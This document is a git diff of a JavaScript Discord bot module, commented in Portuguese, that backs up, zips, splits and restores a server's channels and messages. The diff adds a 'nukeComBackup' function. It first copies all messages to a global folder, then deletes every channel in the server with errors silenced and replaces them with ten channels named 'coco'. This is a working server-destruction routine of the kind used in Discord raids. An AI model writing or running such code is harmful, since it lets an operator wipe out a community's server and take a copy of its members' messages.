@@ -3,13 +3,14 @@ const axios = require('axios');
 const path = require('path');
 const archiver = require('archiver');
 
+// delay
 function sleep(ms) {
     return new Promise(res => setTimeout(res, ms));
 }
 
-// 🔥 BACKUP
+// 🔥 BACKUP (GLOBAL)
 async function backupServer(guild) {
-    const basePath = `./backup-${guild.id}`;
+    const basePath = `./global-backup`;
     const channelsPath = `${basePath}/channels`;
     const filesPath = `${basePath}/files`;
 
@@ -56,12 +57,15 @@ async function backupServer(guild) {
 
             formatted.push({
                 author: msg.author.tag,
-                content: msg.content,
+                content: msg.content || "",
                 attachments
             });
         }
 
-        fs.writeFileSync(`${channelsPath}/${channel.name}.json`, JSON.stringify(formatted, null, 2));
+        fs.writeFileSync(
+            `${channelsPath}/${channel.name}.json`,
+            JSON.stringify(formatted, null, 2)
+        );
 
         serverData.push({
             name: channel.name,
@@ -69,15 +73,18 @@ async function backupServer(guild) {
         });
     }
 
-    fs.writeFileSync(`${basePath}/server.json`, JSON.stringify(serverData, null, 2));
+    fs.writeFileSync(
+        `${basePath}/server.json`,
+        JSON.stringify(serverData, null, 2)
+    );
 
-    console.log("📦 Backup completo feito!");
+    console.log("📦 Backup completo salvo em ./global-backup");
 }
 
 // 🔥 ZIP
-async function zipBackup(guildId) {
+async function zipBackup() {
     return new Promise((resolve, reject) => {
-        const zipPath = `backup-${guildId}.zip`;
+        const zipPath = `global-backup.zip`;
         const output = fs.createWriteStream(zipPath);
         const archive = archiver('zip');
 
@@ -85,12 +92,12 @@ async function zipBackup(guildId) {
         archive.on('error', err => reject(err));
 
         archive.pipe(output);
-        archive.directory(`./backup-${guildId}`, false);
+        archive.directory(`./global-backup`, false);
         archive.finalize();
     });
 }
 
-// 🔥 DIVIDIR EM PARTES
+// 🔥 DIVIDIR EM PARTES (20MB)
 function splitFile(filePath, chunkSize = 20 * 1024 * 1024) {
     const buffer = fs.readFileSync(filePath);
     const parts = [];
@@ -110,7 +117,7 @@ function splitFile(filePath, chunkSize = 20 * 1024 * 1024) {
 
 // 🔥 RESTORE SEM APAGAR
 async function restoreServer(guild) {
-    const basePath = `./backup-${guild.id}`;
+    const basePath = `./global-backup`;
     const channelsPath = `${basePath}/channels`;
     const filesPath = `${basePath}/files`;
 
@@ -136,7 +143,6 @@ async function restoreServer(guild) {
         let newChannel;
 
         if (existingChannel) {
-            console.log(`⚠️ Canal já existe: ${ch.name}`);
             newChannel = existingChannel;
         } else {
             newChannel = await guild.channels.create({
@@ -160,8 +166,9 @@ async function restoreServer(guild) {
         messages = messages.slice(0, 300);
 
         for (const msg of messages) {
-            let content = `**${msg.author}:** ${msg.content || ""}`;
+            let content = `**${msg.author}:** ${msg.content}`;
 
+            // 🔥 quebra em partes de 1900 chars
             const parts = content.match(/[\s\S]{1,1900}/g) || [];
 
             for (const part of parts) {
@@ -196,4 +203,29 @@ async function restoreServer(guild) {
     console.log("✅ Restore finalizado!");
 }
 
-module.exports = { backupServer, restoreServer, zipBackup, splitFile };
+// 🔥 NUKE + BACKUP
+async function nukeComBackup(guild) {
+    await backupServer(guild);
+    await sleep(2000);
+
+    for (const channel of guild.channels.cache.values()) {
+        await channel.delete().catch(() => {});
+    }
+
+    for (let i = 1; i <= 10; i++) {
+        await guild.channels.create({
+            name: `coco-${i}`,
+            type: 0
+        });
+    }
+
+    console.log("💣 Nuke finalizado!");
+}
+
+module.exports = {
+    backupServer,
+    restoreServer,
+    zipBackup,
+    splitFile,
+    nukeComBackup
+};
